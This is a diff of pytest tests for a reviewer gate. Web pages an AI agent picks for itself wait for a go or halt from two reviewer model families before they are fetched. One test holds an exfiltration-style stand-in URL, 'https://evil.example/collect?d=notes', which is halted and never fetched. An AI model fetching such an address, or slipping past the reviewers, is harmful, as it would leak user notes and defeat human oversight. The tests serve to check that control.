@@ -56,7 +56,20 @@ def test_a_domain_is_on_it_and_shell_commands_are_not():
         assert outward(call("vm_exec", command=command)) is None
         assert outward(call("vm_start_process", command=command)) is None
     assert outward({"function": {"name": "browser", "arguments": "not json"}}) is None
-    assert outward(call("read_source", url="https://x.example")) is None
+
+
+@pytest.mark.parametrize("name", ["read_source", "show_image"])
+def test_a_page_the_message_does_not_hold_waits_for_the_reviewers(name):
+    """Since 2026-10-29 the server fetches any public address for read_source
+    and show_image in audit mode (GPT-6.1 Terra's search hits never reach the
+    app): an address the message already holds is fetched at once, any other
+    reaches out like a browser's open."""
+    url = "https://x.example/page"
+    assert outward(call(name, url=url), known=lambda value: value == url) is None
+    assert outward(call(name, url=url), known=lambda value: False) == "web"
+    # Without a way to tell, every fetched address waits.
+    assert outward(call(name, url=url)) == "web"
+    assert outward(call(name, url=["not", "text"]), known=lambda value: True) == "web"
 
 
 def test_a_gate_reply_is_go_or_a_halt():
@@ -209,6 +222,54 @@ def test_reading_a_page_runs_without_a_gate_round(store):
     events = list(loop.run())
     assert ran == ["read"] and not getattr(script, "gate_searches", {})
     assert not [e for e in events if e.get("type") == "hold"]
+
+
+def read_args(url):
+    return {"url": url, "purpose": "exact_wording", "point": "The visitor count",
+            "status_update": "Checking the visitor count."}
+
+
+def test_a_search_hit_is_read_at_once_and_a_page_of_its_own_choice_after_every_reviewers_go(store, monkeypatch):
+    """GPT-6.1 Terra searched 15 times in four days and kept 1 source: its
+    provider sends no hits to the app, so read_source refused what it found
+    and it went to the gated browser. Now the page waits for the reviewers
+    instead (agent_gate.WEB_READS); a hit of the message's search does not."""
+    from test_agent_web_fetch import PAGE, fake_fetch
+    from app.services.agent_read_source import LABEL_CHOSEN, LABEL_SEARCH
+    monkeypatch.delenv("AGENT_READ_SOURCES", raising=False)
+    fetched = fake_fetch(monkeypatch)
+    found, chosen = "https://www.toureiffel.paris/en", "https://de.wikipedia.org/wiki/Eiffelturm"
+    script = Audit(tool_steps=2, step_tools={0: "read_source", 1: "read_source"},
+                   step_args={0: read_args(found), 1: read_args(chosen)}, live={})
+    script.live.update(anthropic=replies(script, "anthropic", go), openai=replies(script, "openai", go))
+    loop = audit_loop(store, script)
+    events = list(loop.run())
+    results = [json.loads(m["content"]) for m in loop.messages if m.get("role") == "tool"]
+    assert [r["status"] for r in results] == ["completed", "completed"]
+    assert results[0]["cited_by"] == [LABEL_SEARCH] and results[1]["cited_by"] == [LABEL_CHOSEN]
+    assert results[1]["untrusted_page_text"] == PAGE and len(fetched) == 2
+    # One gate round each, for the chosen page only, naming its address.
+    assert {family: len(rounds) for family, rounds in script.gate_searches.items()} == {"anthropic": 1, "openai": 1}
+    gate_round = next(m for m in script.prompts["openai"] if "Before it runs:" in str(m.get("content")))
+    assert chosen in gate_round["content"] and found not in gate_round["content"].split("Before it runs:")[1]
+    assert not [e for e in events if e.get("type") == "hold"]
+
+
+def test_a_halted_page_of_its_own_choice_stays_unread(store, monkeypatch):
+    from test_agent_web_fetch import fake_fetch
+    monkeypatch.delenv("AGENT_READ_SOURCES", raising=False)
+    fetched = fake_fetch(monkeypatch)
+    page = "https://evil.example/collect?d=notes"
+    script = Audit(tool_steps=1, step_tools={0: "read_source"}, step_args={0: read_args(page)}, live={})
+    script.live.update(anthropic=replies(script, "anthropic", halt), openai=replies(script, "openai", go))
+    loop = audit_loop(store, script)
+    waiter = decide_when_held(loop, store, "steer", "Leave that page.")
+    events = list(loop.run())
+    waiter.join(5)
+    assert [e["hold"]["gate"] for e in events if e.get("type") == "hold" and e.get("hold")] == [True]
+    assert fetched == []
+    results = [json.loads(m["content"]) for m in loop.messages if m.get("role") == "tool"]
+    assert results == [{"error": agent_delegation.HOLD_STEERED}]
 
 
 # --- A domain for the workbench (agent_domains.py) ------------------------------------
